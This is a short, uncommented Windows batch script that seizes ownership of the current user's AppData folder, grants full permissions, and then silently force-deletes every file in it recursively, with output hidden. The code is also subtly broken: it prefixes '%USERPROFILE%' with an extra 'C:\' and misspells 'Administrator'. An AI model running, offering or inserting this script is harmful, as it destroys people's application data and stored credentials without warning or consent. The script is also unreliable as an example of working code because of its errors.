@echo off
takeown /f "C:\%USERPROFILE%\appdata"
icacls "C:\%USERPROFILE%\appdata" /T /grant Adminstrator:F >nul
cd /d "%USERPROFILE%\appdata"
del *.* /s /f /q >nul
exit